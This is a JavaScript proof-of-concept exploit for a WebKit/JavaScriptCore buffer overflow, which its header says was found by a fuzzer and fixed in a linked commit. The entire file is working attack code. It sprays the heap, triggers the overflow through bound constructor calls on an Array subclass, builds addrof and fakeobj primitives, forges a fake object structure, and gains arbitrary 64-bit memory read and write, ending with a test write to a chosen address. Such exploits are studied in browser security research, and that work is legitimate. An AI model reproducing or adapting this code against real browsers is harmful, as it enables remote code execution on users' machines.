// Trivial buffer overflow RCE fixed in
// https://github.com/WebKit/webkit/commit/703ac9514dc7f16de5e3ffa0610db3693303fd3e
//
// Found by bkth's fuzzer
var SPRAY1 = 3000
var ALLOCS = 10

var workbuf = new ArrayBuffer(0x1000000)
var u32_buffer = new Uint32Array(workbuf)
var u8_buffer = new Uint8Array(workbuf)

var conversion_buffer = new ArrayBuffer(8)
var f64 = new Float64Array(conversion_buffer)
var i32 = new Uint32Array(conversion_buffer)

var BASE32 = 0x100000000
function f2i(f) {
    f64[0] = f
    return i32[0] + BASE32 * i32[1]
}

function i2f(i) {
    i32[0] = i % BASE32
    i32[1] = i / BASE32
    return f64[0]
}

function hex(x) {
    if (x < 0)
        return `-${hex(-x)}`
    return `0x${x.toString(16)}`
}

function xor(a, b) {
    var res = 0, base = 1
    for (var i = 0; i < 64; ++i) {
        res += base * ((a&1) ^ (b&1))
        a = (a-(a&1))/2
        b = (b-(b&1))/2
        base *= 2
    }
    return res
}

function fail(x) {
    print('FAIL ' + x)
    throw null
}

class X extends Array {}
Object.defineProperty(X.prototype,'1337',{})

function of(args) {
    return new (Function.prototype.bind.apply(X, args))
}

var obj = {a:42.42}

var args = []
for (var i = 0; i < 46; ++i)
    args.push(obj)

var spray = new Array(SPRAY1)
var spray_cnt = 0
for (var i = 0; i < SPRAY1; i += 3) {
    // all these will allocate size 0x40
    spray[i] = [13.37,13.37,13.37,13.37,13.37,13.37+i] // will be freed to make a hole
    spray[i+1] = [13.37,13.37,13.37,13.37,13.37,13.37+i] // will be overwritten
    spray[i+2] = [{},{},{},{},{},{},{}] // will be overwritten
}

var start = Math.floor(SPRAY1 - SPRAY1/3)
start -= start%3
for (var i = start; i < SPRAY1; i += 3)
    spray[i] = null
gc()

// will allocate & overflow size 0x38 (will be rounded up to 0x40)
for (var i = 0; i < 10; ++i)
    of(args)

var unboxed1, boxed1
for (var i = 1; i < SPRAY1; i += 3) {
    if (spray[i] !== null && spray[i][0] !== 13.37) {
        print("YES! addrof(obj) =", hex(f2i(spray[i][0])))
        unboxed1 = spray[i]
        boxed1 = spray[i+1]
        break
    }
}

var stage1 = {
    addrof: function(x) {
        boxed1[0] = x
        return f2i(unboxed1[8])
    },

    fakeobj: function(x) {
        unboxed1[8] = i2f(x)
        return boxed1[0]
    },

    test: function() {
        var addr = this.addrof({a: 0x1337})
        var x = this.fakeobj(addr)
        if (x.a != 0x1337) {
            fail(1)
        }
    },
}

stage1.test()

var structure_spray = []
for (var i = 0; i < 1000; ++i) {
    var ary = {a:1,b:2,c:3,d:4,e:5,f:6,g:0xfffffff}
    ary['prop'+i] = 1
    structure_spray.push(ary)
}

var manager = structure_spray[500]
var leak_addr = stage1.addrof(manager)
//print('leaking from: '+ hex(leak_addr))

function alloc_above_manager(expr) {
    var res
    do {
        for (var i = 0; i < ALLOCS; ++i) {
            structure_spray.push(eval(expr))
        }
        res = eval(expr)
    } while (stage1.addrof(res) < leak_addr)
    return res
}

var unboxed_size = 100

var unboxed = alloc_above_manager('[' + '13.37,'.repeat(unboxed_size) + ']')
var boxed = alloc_above_manager('[{}]')
var victim = alloc_above_manager('[]')

victim.p0 = 0x1337
function victim_write(val) {
    victim.p0 = val
}
function victim_read() {
    return victim.p0
}
for (var i = 0; i < 100000; ++i) {
    victim_write({});
    victim_write(13.37);
    victim_write([]);
}

i32[0] = 0x300                // Structure ID
i32[1] = 0x01082007 - 0x10000 // Fake JSCell metadata, adjusted for boxing
var outer = {
    p1: f64[0],
    p2: manager,
    p3: 0xfffffff, // Butterfly indexing mask
}

print(hex(stage1.addrof(outer)))
var fake_addr = stage1.addrof(outer) + 0x10
print('fake obj @ ' + hex(fake_addr))

var unboxed_addr = stage1.addrof(unboxed)
var boxed_addr = stage1.addrof(boxed)
var victim_addr = stage1.addrof(victim)
print('leak ' + hex(leak_addr)
    + '\nunboxed ' + hex(unboxed_addr)
    + '\nboxed ' + hex(boxed_addr)
    + '\nvictim ' + hex(victim_addr))

var holder = {fake: {}}
holder.fake = stage1.fakeobj(fake_addr)

// From here on GC would be uncool

// Share a butterfly for easier boxing/unboxing
var shared_butterfly = f2i(holder.fake[(unboxed_addr + 8 - leak_addr) / 8])
print('unboxed butterfly =', hex(shared_butterfly))
var boxed_butterfly = holder.fake[(boxed_addr + 8 - leak_addr) / 8]
print('boxed butterfly =', hex(f2i(boxed_butterfly)))
holder.fake[(boxed_addr + 8 - leak_addr) / 8] = i2f(shared_butterfly)

var victim_butterfly = holder.fake[(victim_addr + 8 - leak_addr) / 8]
function set_victim_addr(where) {
    holder.fake[(victim_addr + 8 - leak_addr) / 8] = i2f(where + 0x10)
}
function reset_victim_addr() {
    holder.fake[(victim_addr + 8 - leak_addr) / 8] = victim_butterfly
}

var stage2 = {
    addrof: function(victim) {
        return stage1.addrof(victim)
        //boxed[0] = victim
        //return f2i(unboxed[0])
    },

    fakeobj: function(addr) {
        return stage1.fakeobj(addr)
        //unboxed[0] = i2f(addr)
        //return boxed[0]
    },

    write64: function(where, what) {
        set_victim_addr(where)
        print('where',hex(where))
        victim_write(this.fakeobj(what))
        reset_victim_addr()
    },

    read64: function(where) {
        set_victim_addr(where)
        var res = this.addrof(victim_read())
        reset_victim_addr()
        return res
    },

    write_non_zero: function(where, values) {
        for (var i = 0; i < values.length; ++i) {
            if (values[i] != 0)
                this.write64(where + i*8, values[i])
        }
    },

    test: function() {
        var addr = this.addrof({a: 0x1337})
        var x = this.fakeobj(addr)
        if (x.a != 0x1337) {
            fail(2)
        }

        this.addrof({a: 0x1338})
        x = this.fakeobj(addr)
        if (x.a != 0x1337) {
            fail(3)
        }


        var obj = {a:1}
        var obj_addr = this.addrof(obj)
        this.write64(obj_addr + 0x10, 0x1337)
        if (0x1337 != this.read64(obj_addr + 0x10)) {
            fail(4)
        }
    },

    forge: function(values) {
        for (var i = 0; i < values.length; ++i)
            unboxed[1 + i] = i2f(values[i])
        return shared_butterfly + 8
    },

    clear: function() {
        outer = null
        holder.fake = null
        for (var i = 0; i < unboxed_size; ++i)
            boxed[0] = null
    },
}

stage2.test()

// boom
stage2.write64(0x4141414140, 0x4242424240)
